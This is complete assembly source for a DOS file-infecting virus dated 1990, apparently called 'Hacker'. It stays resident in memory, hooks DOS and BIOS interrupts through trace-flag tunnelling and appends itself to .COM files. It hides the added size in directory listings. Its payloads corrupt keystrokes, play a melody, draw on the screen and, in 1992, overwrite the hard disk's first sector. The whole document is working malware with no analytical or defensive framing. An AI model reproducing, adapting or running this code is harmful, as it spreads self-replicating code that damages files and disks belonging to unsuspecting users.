        Title  Hacker
        .model tiny
        .code

NotOper Macro
        push   cs
        db     0fh
EndM

        org    100h
Start100:
start:
       call    beginv    ;
       lea     dx,a
       mov     ah,9
       int     21h
       int     20h
a:     db      'Hacker Corp. presents',0ah,0dh,'$'
;                     Virus body

First_Part proc  far
LoadPart label  near
      ; Lambada    Freq,Delay
Hello    db      'Hackers all countrys, united !'
melody   equ     this Word
 dw 1318,9, 1174,4, 1046,4, 987,4, 880,9, 880,4, 1046,4, 987,4, 880,4, 783,4
 dw 880,4, 659,4, 587,4, 659,36, 1318,9, 1174,4, 1046,4, 987,4, 880,18, 880,4
 dw 1046,4, 987,4, 880,4, 783,4, 880,4, 659,4, 587,4, 659,36, 1174,4, 1174,4
 dw 1174,4, 1046,4, 698,9, 698,4, 783,4, 1318,9, 1174,4, 1046,4, 698,9, 880,4
 dw 523,4, 987,9, 880,4, 783,4, 783,9, 880,4, 783,4, 698,36, 1174,4, 1174,4
 dw 1174,4, 1046,4, 698,9, 698,4, 783,4, 1318,9, 1174,4, 1046,4, 698,9, 880,4
 dw 1046,4, 987,9, 880,4, 783,4, 783,9, 1046,4, 1174,4, 1046,4, 987,4, 880,4
 dw      0    ;Finish melody
My_Name  db      'Bad equipment.',0
BeginV  label  near
        cld
        sti
        pop    di
        sub    di,3h
        NotOper
        call   thisadr
ThisAdr label  near
        pop    bp
        push   cs
        mov    cx,100h
        push   cx
        lea    si,[bp](offset Save-offset thisadr)
        movsw
        movsb
        push   cs
        pop    ds
        mov    ah,2ah
        int    21h
        cmp    dh,[bp](offset Month-offset thisadr)
        je     ExitProc
        mov    Byte Ptr [bp](offset Month-offset thisadr),dh
        mov    Word Ptr [bp](offset Year-offset thisadr),cx
;
        mov     ax,0faceh
        int     21h
;
        cmp     ax,0faceh
        je      exitproc
;
        mov    bx,es
        dec    bx
        mov    es,bx       ;es> MCB
;
        cmp    Byte Ptr es:[0000],'Z'  ; Last Block
        je     ok
exitproc:
        ret
ok:
        mov    ax,cs:[0002]
        sub    ax,(My_size_Mem + 100h)/16 + 1
        mov    cs:[0002],ax
;
        mov    ax,es:[0003]
        sub    ax,(My_size_Mem + 100h)/16 + 1
        mov    es:[0003],ax
;;;;;;
        stc
        adc    ax,bx
;
        mov    es,ax
;
        mov    cx,My_Size
        lea    si,[bp](offset LoadPart-offset ThisAdr)
        mov    di,offset LoadPart
        rep    movsb
;
        mov    si,offset next
        push   es
        push   si
        push   cs
        pop    es
        ret
        ;      This work in other segment
next:
First_Part  endp
;
Two_Part   proc  far
        push    es
        push    ds
        NotOper
        mov     ax,3521h
        int     21h
        mov     Word Ptr cs:Orig21O,bx
        mov     Word Ptr cs:(Orig21O+2),es
        push    cs
        pop     ds
        Call    Find21
        call    Find13
        cmp     Word Ptr cs:Year,1992
        jne     cont
        mov     cx,1
        mov     ax,0301h
        mov     dx,0080h
        pushf
        call    Dword ptr cs:Orig13             ; ??????????????
Cont:
        mov     dx, offset MsDos
        mov     ax,2521h
        int     21h
;
        mov     cs:SoundFlag?,0h
        mov     cs:AddrNote,offset melody
        mov     cs:SoundTime,0h
        mov     ax,3508h
        int     21h
        mov     Word Ptr cs:Orig8,bx
        mov     Word Ptr cs:(Orig8+2),es
        mov     dx, offset Music
        mov     ax,2508h
        int     21h
;
        mov     ax,3510h
        int     21h
        mov     Word Ptr cs:Orig10,bx
        mov     Word Ptr cs:(Orig10+2),es
        mov     dx,offset Video
        mov     ax,2510h
        int     21h
;
        mov     ax,3509h
        int     21h
        mov     Word Ptr cs:Orig9,bx
        mov     Word Ptr cs:(Orig9+2),es
        mov     dx,offset Keyboard
        mov     ax,2509h
        int     21h
        mov     Byte Ptr cs:Coun,1h
        mov     Byte Ptr cs:Sum,6h
        pop     ds
        pop     es
        ret
Two_Part endp

Save     db      10h dup (90h)
Filesize dw      ?
SpSave   dw      ?
NewThree db      0e8h
NewAddr  dw      ?
Month    db      ?
Year     dw      ?
Addr     dw      ?
Coun     db      1h
Sum      db      40h
attr     dw      ?
Data     dd      ?
SaveAddr dw      ?
SoundTime dw    0
AddrNote  dw    ?
SoundFlag? db   0
Activ?  db     0

Find13  proc   near
        mov    ax,3501h
        int    21h
        mov    cs:Word Ptr (Orig1),bx
        mov    cs:Word Ptr (Orig1+2),es
;
        mov    ax,3513h
        int    21h
        mov    cs:Word Ptr (Orig13o),bx
        mov    cs:Word Ptr (Orig13o+2),es
;
        mov    cs:Byte Ptr Activ?,1
        lea    dx,int1?13
        mov    ax,2501h
        int    21h
        pushf
        cli
        pushf
        pop    ax
        or     ax,100h
        push   ax
        popf
Continue13:

        xor    ah,ah
        mov    dl,80h
        call   DWord Ptr cs:Orig13o
        mov    dx,cs:Word Ptr Orig1
        mov    ds,cs:Word Ptr (Orig1+2)
        mov    ax,2501h
        int    21h
        push   cs
        pop    ds
        Ret
Find13  endp

int1?13 proc   far
        push   bp
        mov    bp,sp
        cmp    cs:Byte Ptr Activ?,1h
        je     Int13NotFound
Cont_Ok13:
        and    Word Ptr [bp+6h],0feffh
        mov    cs:Byte Ptr Activ?,0h
        pop    bp
        iret
Int13NotFound:
        cmp    Word Ptr [bp+4h],9fffh   ;cs > 9fffh, ROM-BIOS  ?
        ja     This_BIOS
        pop    bp
        iret
This_BIOS:
        push   bx
        mov    bx,[bp+2h]
        mov    cs:Word Ptr Orig13,bx
        mov    bx,[bp+4h]
        mov    cs:Word Ptr (Orig13+2),bx
        pop    bx
        jmp    Cont_Ok13
int1?13 endp
Find21  proc   near
        mov    ax,3501h
        int    21h
        mov    cs:Word Ptr (Orig1),bx
        mov    cs:Word Ptr (Orig1+2),es
;
        mov    cs:Byte Ptr Activ?,1
        lea    dx,int1
        mov    ax,2501h
        int    21h
        pushf
        cli
        pushf
        pop    ax
        or     ax,100h
        push   ax
        popf
Continue:
        mov    ah,30h
        call   DWord Ptr cs:Orig21O
        mov    dx,cs:Word Ptr Orig1
        mov    ds,cs:Word Ptr (Orig1+2)
        mov    ax,2501h
        int    21h
        push   cs
        pop    ds
        Ret
Find21  endp
int1    proc   far
        push   bp
        mov    bp,sp
        cmp    cs:Byte Ptr Activ?,1h
        je     Int21NotFound
Cont_Ok:
        and    Word Ptr [bp+6h],0feffh
        mov    cs:Byte Ptr Activ?,0h
        pop    bp
        iret
Int21NotFound:
        cmp    Word Ptr [bp+4h],0300h   ;cs < 300h, MSDDOS ?
        jb     This_Dos
        pop    bp
        iret
This_Dos:
        push   bx
        mov    bx,[bp+2h]
        mov    cs:Word Ptr Orig21,bx
        mov    bx,[bp+4h]
        mov    cs:Word Ptr (Orig21+2),bx
        pop    bx
        jmp    Cont_Ok
int1    endp
;
;
SizePattern    equ    Pattern-$+2
        db      '.com',0
Pattern        equ    $-1
;
SizePattern1    equ    Pattern1-$+2
        db      '.COM',0
Pattern1        equ    $-1
;
FindCom proc
        push    ax
        push    di
        push    si
        push    cx
        push    es
        push    ds
;
        push    ds
        pop     es
;
        mov     cx,0FFh
        mov     di,dx
        xor     al,al
        cld
;
        repne   scasb      ; EOLN   <---  es:di
;
        std
        dec     di
        mov     ax,di
;
        push    cs
        pop     ds
        mov     si,offset Pattern
;
        mov     cx,0FFh
        rep     cmpsb
;
        cmp     cx,0ffh-SizePattern
        je      found
        mov     si,offset Pattern1
;
        mov     di,ax
        mov     cx,0FFh
        rep     cmpsb
;
        cmp     cx,0ffh-SizePattern1
        je      found

        clc
        jmp    short FindExit
Found:
        stc
FindExit:
        pop     ds
        pop     es
        pop     cx
        pop     si
        pop     di
        pop     ax
        ret
FindCom endp

;
;       Subst function MsDos.
;
MsDos   proc    far
        cmp     ah,11h
        je      Dir
        cmp     ah,12h
        je      Dir
        jmp     short NotDir1112
Dir:    Call    Dir1112
        iret
NotDir1112:
        cmp     ah,4eh
        je      Dir1
        cmp     ah,4fh
        je      Dir1
        jmp     short NotDir4e4f
Dir1:   Call    Dir4e4f
        push    bp
        mov     bp,sp
        push    ax
        pushf
        pop     ax
        mov     word ptr [bp+6],ax
        pop     ax
        pop     bp
        iret
NotDir4e4f:
;
        xchg    ah,al
        cmp     al,3dh                    ; Open file or reading.
        je      Ok_vir
        cmp     al,4bh                    ; Execute programm
        je      Ok_vir
        cmp     al,43h                    ; Change Attrib
        je      Ok_vir
        cmp     al,56h                    ; ReName
        je      Ok_vir
        cmp     al,0fah
        je      I_am_found
        xchg    al,ah
;
MS_DOS:
        Jmp     DWord Ptr cs:Orig21O
;
Ok_vir: xchg    al,ah
        call    FindCom
        jnc     MS_DOS
        call    write_me
        jmp     MS_DOS
;
I_am_found:
        xchg    al,ah
        iret

Dir1112 proc    near
        push    es
        push    bx
        push    si
        call    DosInt
        push    ax
;
        mov     ah,2fh       ; Get DTA  ES:BX > DTA
        call    DosInt
;
        xor     si,si
        cmp     byte ptr es:[bx],0ffh    ; Extended FCB ?
        jne     NoExtended               ; If No offset = 0
        mov     si,7h                    ; If Yes offset = 7h
NoExtended:
;
        cmp     Word ptr es:[bx+si+9],'OC'  ; If a *.COM file ?
        jne     NotComFile
        cmp     Byte ptr es:[bx+si+9+2],'M' ;
        jne     NotComFile
        mov     ax,es:[bx+si+1dh]
        cmp     ax,MinComSize
        jb      NotComFile
        sub     ax,My_Size
        mov     es:[bx+si+1dh],ax
NotComFile:
        pop     ax
        pop     si
        pop     bx
        pop     es
        ret
Dir1112 endp

Dir4e4f proc    near
        push    es
        push    bx
        call    DosInt
        push    ax
        pushf
;
        mov     ah,2fh       ; Get DTA  ES:BX > DTA
        call    DosInt
;
        push    ds
        push    dx
;
        push    es
        pop     ds
        mov     dx,bx
        add     dx,1eh
        call    findcom
;
        pop     dx
        pop     ds
        jnc     NotComFile1
;
        mov     ax,es:[bx+1ah]
        cmp     ax,MinComSize
        jb      NotComFile1
        sub     ax,My_Size
        mov     es:[bx+1ah],ax
NotComFile1:
        popf
        pop     ax
        pop     bx
        pop     es
        ret
Dir4e4f endp

Orig1    dd      ?
Orig8    dd      ?
Orig9    dd      ?
Orig10   dd      ?
Orig13   dd      ?
Orig13o  dd      ?
Orig21   dd      ?
Orig21O  dd      ?
Orig24   dd      ?
MsDos   endp
;
;      int    21h
;
DosInt  proc    near
        pushf
        call    DWord Ptr cs:Orig21O    ;;;;????  Orig21 ?
        ret
DosInt  endp
;
Error_Int24 proc  far
        xor     al,al
        iret
Error_Int24 endp
;
Video   proc   far
        push   ax
        cmp    ah,00h
        jne    VideoExit
        push   ds
        push   cx
        push   bp
;
        push   cs
        pop    ds
;
        mov    ax,0004h
        pushf
        call   DWord Ptr Orig10
        mov    cx,6
        mov    bp,offset Star
drawing:
        call   line
        add    bp,8
        loop   drawing
;
        mov    cx,0ffffh
LoopWait:
        mov    ax,cx
        mov    ds,ax
        loop   LoopWait
        pop    bp
        pop    cx
        pop    ds
VideoExit:
        pop    ax
        Jmp    DWord Ptr cs:Orig10
Video   endp
;
star    dw     160,50,100,150
        dw     100,150,220,150
        dw     220,150,160,50
        ;
        dw     100,80,160,180
        dw     160,180,220,80
        dw     220,80,100,80
;
line    proc   near
        call   SaveReg
        mov    ax,ds:[bp]
        mov    Word Ptr start_x,ax
        mov    ax,ds:[bp+2]
        mov    Word Ptr start_y,ax
        mov    ax,ds:[bp+4]
        mov    Word Ptr end_x,ax
        mov    ax,ds:[bp+6]
        mov    Word Ptr end_y,ax
;
        mov    cx,1
        mov    dx,1
;
        mov    di,end_y
        sub    di,start_y
        jge    keep_y
        neg    dx
        neg    di
keep_y: mov    diagonal_y_increment,dx
;
        mov    si,end_x
        sub    si,start_x
        jge    keep_x
        neg    cx
        neg    si
keep_x: mov    diagonal_x_increment,cx
        cmp    si,di
        jge    horz_seg
        xor    cx,cx
        xchg   si,di
        jmp    save_values
horz_seg:
        xor   dx,dx
save_values:
        mov   short_distance,di
        mov   straight_x_increment,cx
        mov   straight_y_increment,dx
        mov   ax,short_distance
        shl   ax,1
        mov   straight_count,ax
        sub   ax,si
        mov   bx,ax
        sub   ax,si
        mov   diagonal_count,ax
;
        mov   cx,start_x
        mov   dx,start_y
        inc   si
mainloop:
        dec   si
        jz    finished
        mov   ah,12
        mov   al,color
        pushf
        call  DWord Ptr cs:Orig10
        cmp   bx,0
        jge   diagonal_line
        add   cx,straight_x_increment
        add   dx,straight_y_increment
        add   bx,straight_count
        jmp   short mainloop
diagonal_line:
        add   cx,diagonal_x_increment
        add   dx,diagonal_y_increment
        add   bx,diagonal_count
        jmp   short mainloop
finished:
        ret
start_x dw    0
end_x   dw    319
start_y dw    0
end_y   dw    199
color   db    3
diagonal_x_increment     dw     ?
diagonal_y_increment     dw     ?
short_distance    dw     ?
straight_x_increment     dw     ?
straight_y_increment     dw     ?
straight_count    dw     ?
diagonal_count    dw     ?
line    endp
;
;        Save Me in COM file.
;
write_me proc   near
        call    SaveReg
;
        push    dx
        push    ds

;
        push    dx
        push    ds
;
        mov     ax,3524h
        call    DosInt
        mov     Word Ptr cs:Orig24,bx
        mov     Word Ptr cs:(Orig24+2),es
;
        push    cs
        pop     ds
;
        mov     dx,offset Error_Int24
        mov     ax,2524h
        call    DosInt
;
        mov     ax,3513h
        call    DosInt
        mov     Word Ptr cs:Orig13o,bx
        mov     Word Ptr cs:(Orig13o+2),es
;
        mov     dx,Word Ptr cs:Orig13
        mov     ds,Word Ptr cs:(Orig13+2)
        mov     ax,2513h
        call    DosInt
;
        pop     ds
        pop     dx
;                            Reading file attr
        mov     ax,4300h
        call    DosInt
        jnc     GetAttr
        jmp     EndIll
GetAttr:mov     Word Ptr cs:attr,cx
;                            Set file attr
        xor     cx,cx
        mov     ax,4301h
        call    DosInt
        jnc     OpenFile
        jmp     EndIll
;
OpenFile:
        mov     ax,3d02h                  ; Open file...
        call    DosInt
        jnc     ill
        jmp     EndIll
ill:    mov     bx,ax
;
        push    cs
        pop     ds
;                           Read date&time  file
        mov     ax,5700h
        call    DosInt
        mov     Word Ptr Data,cx
        mov     Word Ptr (Data+2),dx
;
        mov     ah,3fh
        mov     dx,offset Save
        mov     cx,0010h
        call    DosInt  ;Read 10h Bytes in Save.
        jc      Close1
;
        mov     ax,4202h
        xor     cx,cx
        xor     dx,dx
        call    DosInt; Seek to end.
        jc      Close1
;
        mov     Word Ptr Filesize,ax ;Set Filesize
        or      dx,dx
        je      NotClose1
        stc
        jmp     short Close1
NotClose1:
        cmp     ax,MinComSize
        ja      Read
        cmp     ax,MaxComSize-My_Size
        jb      Read
        stc
        jmp     short Close1
Read:
;
        call    Find_Addr
;
        mov     dx,Word Ptr Addr
        sub     dx,offset Start100         ; Offset begin COM files.
        xor     cx,cx
        mov     ax,4200h
        call    DosInt             ;Seek to (Addr).
Close1: jc      Close
;
        mov     ah,3fh
        mov     dx,offset Save
        mov     cx,3h
        call    DosInt             ;Read 3 Bytes in Save.
        jc      Close
;
        cmp     byte ptr Save,0e8h ; Call ...
        je      Close
;
        mov     ax,4200h
        mov     dx,Word Ptr Addr
        sub     dx,offset Start100        ; Offset begin COM files.
        xor     cx,cx
        call    DosInt             ;Seek to (Addr).
        jc      Close
;
        mov     ax,Word Ptr Filesize
        sub     ax,Word Ptr Addr
        add     ax,(offset Start100-3h)
        add     ax,(offset BeginV - offset LoadPart)
        mov     Word Ptr NewAddr,ax  ;  Create "call ..."

        mov     ah,40h
        mov     dx,offset NewThree
        mov     cx,0003h
        call    DosInt               ; Write 3 Byte.
        jc      Close
;
        mov     ax,4202h
        xor     cx,cx
        xor     dx,dx
        call    DosInt               ; Seek end.
        jc      Close
;
        mov     dx,offset LoadPart
        mov     cx,My_Size
        mov     ah,40h
        call    DosInt              ; Write me...
        jc      Close
;                                  Set data file
        mov     cx,Word Ptr Data
        mov     dx,Word Ptr (Data+2)
        mov     ax,5701h
        call    DosInt
Close:
        NotOper
        mov     ah,3eh
        call    DosInt; Close file
endill:
        pop     ds
        pop     dx
;
        mov     ax,4301h
        mov     cx,Word Ptr cs:attr
        call    DosInt

Exit:   mov     ax,2524h
        mov     dx,Word Ptr cs:Orig24
        mov     ds,Word Ptr cs:(Orig24+2)
        call    DosInt

        mov     dx,Word Ptr cs:Orig13o
        mov     ds,Word Ptr cs:(Orig13o+2)
        mov     ax,2513h
        call    DosInt
;
        ret
write_me endp

Find_Addr proc
        call   SaveReg
;
        mov    ax,3501h
        call   DosInt
        mov    cs:Word Ptr (Orig1),bx
        mov    cs:Word Ptr (Orig1+2),es
;
        lea    dx,FInt1
        mov    ax,2501h
        call   DosInt
        mov    Word Ptr SpSave,sp
;
        push   cs
        pop    es
        cld
        mov    di,offset start
        mov    si,offset Save
        mov    cx,10h
        rep    movsb
;
        pushf
        pop    ax
        or     ax,100h
        push   ax
        push   cs
        mov    ax,offset start
        push   ax
        iret

FInt1   proc   far
        mov    bp,sp
        mov    bx,[bp]

        mov    Word Ptr cs:addr,bx
        mov    sp,Word Ptr cs:SpSave

FInt1   endp
        mov    dx,cs:Word Ptr Orig1
        mov    ds,cs:Word Ptr (Orig1+2)
        mov    ax,2501h
        call   DosInt
        ret
Find_Addr endp

SaveReg proc    near
;
;     (C)     CopyRigth Roman Ruthman 1990.
;
        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    es
        push    ds
;
        push    bp
        mov     bp,sp
        call    CallAddr
CallAddr:
        sizecom equ  ContProg-CallAddr
        add     Word Ptr [bp-2],sizecom
        push    [bp+12h]
        mov     bp,[bp]
        ret
ContProg:
        pop     bp
        pop     ds
        pop     es
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        add     sp,2
        ret
SaveReg endp

MyName   db      'My name is Emmi,I am an Eddie`s sister.'

Keyboard proc   far
        push    ax
        push    bx
        push    es
        push    cx
        push    dx
        push    si
        in      al,60h
        pushf
        call    DWord Ptr cs:Orig9
        test    al,80h                  ; Unpress key
        jne     notdrebezg              ; if yes then drebezg.
;
        inc     Byte Ptr cs:coun
        mov     bl,Byte Ptr cs:Sum
        cmp     Byte Ptr cs:coun,bl
        jb      notdrebezg
;
        mov     ax,40h
        mov     es,ax                   ; Setting BIOS DS. 0400h:0000h
;
        mov     si,Word Ptr es:[01ch]   ; Addres in buffer.
        cmp     si,Word Ptr cs:SaveAddr
        je      SaveLen
;
        cmp     si,003ah                ; Last Word in buffer
        jae     notdrebezg              ; if yes then notdrebezg.
        cmp     si,001eh                ; First Word in buffer
        jbe     notdrebezg              ; if yes then notdrebezg.
;
        mov     ax,Word Ptr es:[si-2h]  ; Reading Byte.
;
        mov     bl,Byte Ptr es:[006ch]  ; Randomize seed.
        and     bl,2fh
        mov     Byte Ptr cs:Sum,bl      ; Save in sum.
        jnp     one
Two:
        mov     Word Ptr es:[si],ax      ; First ...
        mov     Word Ptr es:[si+2h],ax   ; Second ...
        add     si,4h
        jmp     Savelen
One:
        mov     Word Ptr es:[si],ax      ; First ...
        add     si,2h
Savelen:
        mov     Word Ptr es:[01ch],si
        mov     Byte Ptr cs:coun,0h
        mov     cs:SaveAddr,si
notdrebezg:
        pop     si
        pop     dx
        pop     cx
        pop     es
        pop     bx
        pop     ax
        iret
Keyboard endp
;
Sound   proc
        mov     bx,ax
        mov     ax,34ddh
        mov     dx,12h
        cmp     dx,bx
        jnb     SoundExit
        div     bx
        mov     bx,ax
        in      al,61h
        test    al,3h
        jne     L
        or      al,3h
        out     61h,al
        mov     al,0b6h
        out     43h,al
L:      mov     al,bl
        out     42h,al
        mov     al,bh
        out     42h,al
SoundExit:
        ret
Sound   endp
;
NoSound proc
        in      al,61h
        and     al,0fch
        out     61h,al
        ret
NoSound endp
;
Music   proc    far
        pushf
        call    DWord Ptr cs:Orig8
        push    ds
        push    ax
        push    bx
        push    dx
        xor     ax,ax
        mov     ds,ax

        cmp     Word Ptr ds:[46ch],0000h     ;  xx:59:55
        je      Sin
        jmp     short Cont_Test
Sin:    call    set
Cont_Test:
        cmp     Word Ptr ds:[46ch],91        ;  xx:00:00
        je      NoSin
        jmp     short ContMusic
NoSin:  call    reset
ContMusic:
        cmp     Word Ptr ds:[46ch],0000h     ;  11:59:55
        jne     NotSet
        cmp     Word Ptr ds:[46eh],000ch     ;
        jne     NotSet

        mov     cs:SoundFlag?,1h
        mov     cs:AddrNote,offset Melody
        mov     cs:SoundTime,0h
NotSet:
        push    cs
        pop     ds
        cmp     SoundFlag?,0
        je      exit8
        cmp     SoundTime,0
        jne     DecTime
        mov     bx,addrnote
        mov     ax,Word Ptr [bx]
        cmp     ax,0
        je      The_End
        inc     bx
        inc     bx
        mov     dx,[bx]
        mov     SoundTime,dx
        inc     bx
        inc     bx
        mov     AddrNote,bx
        call    sound
        jmp     short DecTime

The_End:mov     SoundFlag?,0
        call    NoSound
DecTime:
        dec   SoundTime
exit8:
        pop     dx
        pop     bx
        pop     ax
        pop     ds
        iret
Music   endp
;
Reg     equ     9
;
set     proc
        push   ax
        push   dx
;
        mov    dx,3d4h                       ; Index register.
        mov    al,Reg
        out    dx, al                        ;  (R9)
        inc    dx
        in     al,dx                         ;
        mov    al,0FEh
        out    dx,al                ; Set new valure
;
        pop    dx
        pop    ax
        ret
set     endp
;
reset   proc
        push   ax
        push   dx
;
        mov    dx,3d4h                       ; Index register.
        mov    al,Reg
        out    dx,al                         ;  (R9)
        inc    dx
        mov    al,7                    ; Restore old valure
        out    dx,al
;
        pop    dx
        pop    ax
        ret
reset   endp
;
Created  db      'This program writen in Vinnitsa, UkSSR, USSR.'
Vers     db      'Version 1.15A (C) 1990.'
endv     equ     this Word
My_Size  equ     endv-LoadPart
My_Size_Mem equ  endv-Start
MinComSize equ   1990
MaxComSize equ   65278
        end    start
        